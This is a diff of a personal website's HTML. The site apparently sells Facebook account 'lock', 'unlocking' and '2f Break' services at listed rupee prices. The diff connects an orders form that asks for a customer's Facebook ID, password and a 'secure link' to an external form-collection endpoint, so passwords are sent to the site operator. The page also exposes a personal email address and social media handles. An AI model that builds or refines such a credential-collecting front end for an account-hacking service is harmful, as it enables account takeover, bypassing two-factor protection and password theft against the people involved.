@@ -14,19 +14,19 @@
       <ul class="nav-links">
         <li><a href="#about">About</a></li>
         <li class="dropdown">
-          <a href="#gallery">Gallery</a>
-          <div class="dropdown-content">
-            <a href="#">Photos</a>
-            <a href="#">Videos</a>
-          </div>
-        </li>
+            <a href="#gallery">Gallery</a>
+            <div class="dropdown-content">
+              <a href="#">Photos</a>
+              <a href="#">Videos</a>
+            </div>
+          </li>
         <li><a href="#partner">My Partner</a></li>
         <li><a href="#contact">Contact</a></li>
       </ul>
       <div class="social-links">
-        <a href="https://www.facebook.com/Fatta.256/" target="_blank"><i class="fab fa-facebook-f"></i></a>
-        <a href="https://wa.link/umpytt" target="_blank"><i class="fab fa-whatsapp"></i></a>
-        <a href="https://www.instagram.com/satishshrestha025/" target="_blank"><i class="fab fa-instagram"></i></a>
+        <a href="https://www.facebook.com/your-profile" target="_blank"><i class="fab fa-facebook-f"></i></a>
+        <a href="https://www.whatsapp.com/your-profile" target="_blank"><i class="fab fa-whatsapp"></i></a>
+        <a href="https://www.instagram.com/your-profile" target="_blank"><i class="fab fa-instagram"></i></a>
       </div>
     </div>
   </nav>
@@ -46,6 +46,8 @@
     </div>
   </section>
 
+  <!-- Your Gallery Section Here -->
+
   <section id="partner">
     <div class="container">
       <h2>My Partner</h2>
@@ -60,16 +62,16 @@
       <h2>Contact Me</h2>
       <p>Feel free to contact me using the form below or via email at satishshrestha528@gmail.com.</p>
       <button id="show-contact-form">Contact Me</button>
-      <form action="#" method="POST" id="contact-form" class="form" style="display: none;">
+      <form action="https://formspree.io/f/xayrbnqa" method="POST" id="contact-form">
+        <!-- Contact form inputs -->
         <label for="name">Name:</label>
         <input type="text" id="name" name="name" required>
         <label for="email">Email:</label>
         <input type="email" id="email" name="email" required>
         <label for="message">Message:</label>
         <textarea id="message" name="message" required></textarea>
-        <button type="submit">Send</button>
+        
       </form>
-      <div id="contact-response" style="display: none;"></div>
     </div>
   </section>
   
@@ -78,7 +80,8 @@
       <h2>Send Orders</h2>
       <p>Add Fb name and dob for lock unlocking...</p>
       <button id="show-send-orders-form">Send Orders</button>
-      <form action="#" method="POST" id="send-orders-form" class="form" style="display: none;">
+      <form action="https://formspree.io/f/xayrbnqa" method="POST" id="send-orders-form">
+        <!-- Send orders form inputs -->
         <label for="order-name">Name:</label>
         <input type="text" id="order-name" name="order-name" required>
         <label for="dob">Date of Birth:</label>
@@ -90,49 +93,15 @@
         <label for="Id">Fb Id</label>
         <input type="text" id="Id" name="Id" required>
         <label for="Pass">Fb Pass</label>
-        <input type="text" id="Pass" name="Pass" required>
+        <input type="text" id="Id" name="Pass" required>
         <label for="link">Secure Link</label>
-        <input type="text" id="link" name="link" required>
+        <input type="textbox" id="Id" name="link" required>
+
         <button type="submit">Send</button>
       </form>
-      <div id="orders-response" style="display: none;"></div>
     </div>
   </section>
-
-  <section id="price-list">
-    <div class="container">
-      <h2>Price List</h2>
-      <button id="toggle-price-list">Open Price List</button>
-      <div id="price-list-content" style="display: none;">
-        <table>
-          <thead>
-            <tr>
-              <th>Item</th>
-              <th>Price</th>
-              <th>Action</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td>Lock</td>
-              <td>Rs. 700</td>
-              <td><button class="pay-now">Pay Now</button></td>
-            </tr>
-            <tr>
-              <td>2f Break</td>
-              <td>Rs. 800</td>
-              <td><button class="pay-now">Pay Now</button></td>
-            </tr>
-            <tr>
-              <td>Safe</td>
-              <td>Rs. 900</td>
-              <td><button class="pay-now">Pay Now</button></td>
-            </tr>
-          </tbody>
-        </table>
-      </div>
-    </div>
-  </section>
+  
 
   <footer>
     <div class="container">
